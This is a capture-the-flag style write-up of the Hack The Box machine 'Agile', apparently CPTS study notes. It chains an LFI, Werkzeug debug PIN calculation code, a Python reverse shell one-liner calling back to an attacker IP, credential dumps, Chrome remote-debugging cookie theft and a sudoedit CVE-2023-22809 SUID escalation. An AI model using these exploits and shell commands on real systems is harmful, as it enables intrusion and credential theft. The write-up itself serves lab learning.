---
title: "HTB Agile"
date: 2026-05-17 23:32 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Linux, Meduim]
image: /assets/img/posts/agile/agile.png
---
**HTB Agile** is a Linux machine that starts with exploiting an `LFI` vulnerability on a password manager's export endpoint to read system files, using the leaked information to calculate a `Werkzeug` debug console PIN and gain a shell as `www-data`, recovering database credentials from the app config to dump vault passwords and SSH in as `corum`, pivoting to `edwards` by remotely debugging a `Chrome` instance via SSH port forwarding to steal a session cookie from the test app, and escalating to `root` by abusing `CVE-2023-22809` (`sudoedit` bypass) to overwrite the `venv` activation script as `dev_admin` and inject a `SUID` shell.

## Reconnaissance

### Scanning

- Nmap (All ports)

```
nmap -p- 10.129.228.212 --min-rate 1000 -nv
```
```
PORT      STATE    SERVICE                                                                                                                                   
22/tcp    open     ssh                                                                                                                                       
80/tcp    open     http
```

- NSE Scripts & Version

```
nmap -sCV -p22,80 10.129.228.212 --min-rate 1000 -nv
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Configuration

- /etc/hosts

```bash
sudo nano /etc/hosts #10.129.228.212    superpass.htb
```

## Web

After searching for vhosts through fuzzing (nothing was found) and after registering on the application, we gained the ability to store and export passwords. The issue is that the download endpoint has some problems.

![main](/assets/img/posts/agile/main.png)

### export (LFI)

The first issue is that the endpoint `/download?fn=` is vulnerable to LFI (Local File Inclusion).

![lfi](/assets/img/posts/agile/lfi.png)

### download (Debug Traceback)

The second problem is that there is a debugger that tells us the issue, as shown in the image.

```html
<title>sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (2013, 'Lost connection to MySQL server during query')
[SQL: SELECT users.id AS users_id, users.username AS users_username, users.hashed_password AS users_hashed_password 
FROM users 
WHERE users.id = %(id_1)s 
 LIMIT %(param_1)s]
[parameters: {'id_1': '9', 'param_1': 1}]
(Background on this error at: https://sqlalche.me/e/14/e3q8)
 // Werkzeug Debugger</title>
```

![debug](/assets/img/posts/agile/debug.png)

### Console PIN

And lastly, there's a locked console—we have to find the PIN to run commands.

![console](/assets/img/posts/agile/console.png)

### Exploit 

So we will work with the HackTricks post that talks about how to gather the required information to generate the PIN for the Werkzeug/Flask debug console using LFI.

- [HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html)

We will then use this information to produce the final PIN. Below is the Python code for executing this process:

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

So the target files that we need to read using the LFI is :

```
/proc/self/environ #username = www-data
/proc/net/arp      #interface name = eth0
/sys/class/net/eth0/address #mac address = a2:de:ad:fd:3a:d7
```

```python
int("00:50:56:b9:48:b5".replace(':',''), 16) //privatebits[0] = 179077285493463
// /etc/machine-id  + /proc/self/cgroup //privatebits[1] = ed5b159560f54721827644bc9b220d00superpass.service
```
Here is the working code for the actual PIN:

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'www-data',  # username
    'flask.app',  # modname
    'wsgi_app',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '179077285493463',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'ed5b159560f54721827644bc9b220d00superpass.service'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)
```
### shell as www-data

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.186",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
```
rlwrap -cAr nc -lvnp 9001
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL + z
stty raw -echo;fg
```

- Source Code

```
cat superpass/app.py | grep -i 'conf'
```
```python
def load_config():
    config_path = os.getenv("CONFIG_PATH")
    with open(config_path, 'r') as f:
            app.config[k] = v
```
```
CONFIG_PATH=/app/config_prod.json
```
```json
{
  "SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"
}
```

| username | password             |
|----------|----------------------|
| 0xdf     | 762b430d32eea2f12970 |
| 0xdf     | 5b133f7a6a1c180646cb |
| corum    | 47ed1e73c955de230a1d |
| corum    | 9799588839ed0f98c211 |
| corum    | 5db7caa1d13cc37c9fc2 |

```
nxc ssh 10.129.228.212 -u 'corum' -p pass.txt
SSH         10.129.228.212  22     10.129.228.212   [+] corum:5db7caa1d13cc37c9fc2  Linux - Shell access!
```

### shell as corum
```
ssh corum@10.129.228.212
```

- nginx config :

```
corum@agile:~$ ls /etc/nginx/sites-enabled/
agile.htb.nginx  redirect.nginx  superpass-test.nginx  superpass.nginx
corum@agile:~$ cat /etc/nginx/sites-enabled/superpass-test.nginx 
server {
    listen 127.0.0.1:80;
    server_name test.superpass.htb;

    location /static {
        alias /app/app-testing/superpass/static;
        expires 365d;
    }
    location / {
        include uwsgi_params;
        proxy_pass http://127.0.0.1:5555;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Protocol $scheme;
    }
}
corum@agile:~$ 
```

![ss](/assets/img/posts/agile/ss.png)

There's a test version of the web app that runs locally on port 5555. The question is: is there a session that contains valid credentials in the vault?

![local](/assets/img/posts/agile/local.png)

- [Read-local-Chrome-cookies](https://github.com/defaultnamehere/cookie_crimes)

```
ssh -L 41829:127.0.0.1:41829 corum@10.129.228.212
chrome://inspect/
```

![dev](/assets/img/posts/agile/dev.png)

- inspect

![inspect](/assets/img/posts/agile/inspect.png)

```
edwards:d07867c6267dcb5df0af
```

### su as edwars

```
edwards@agile:~$ id
uid=1002(edwards) gid=1002(edwards) groups=1002(edwards)
edwards@agile:~$ sudo -l
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
edwards@agile:~$ sudo -V
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

### target root

```
edwards@agile:~$ ls -l /app/venv/bin/activate
-rw-rw-r-- 1 root dev_admin 1976 May 18 17:15 /app/venv/bin/activate
edwards@agile:~$ which python
/app/venv/bin/python
edwards@agile:~$ echo $PATH
/app/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
edwards@agile:~$ 
```

```
EDITOR='vim -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json
cp /bin/bash /bin/hoxon
chmod 4777 /bin/hoxon
```

```
edwards@agile:~$ /tmp/hoxon -p
edwards@agile:~# id
uid=1002(edwards) gid=1002(edwards) euid=0(root) groups=1002(edwards)
```
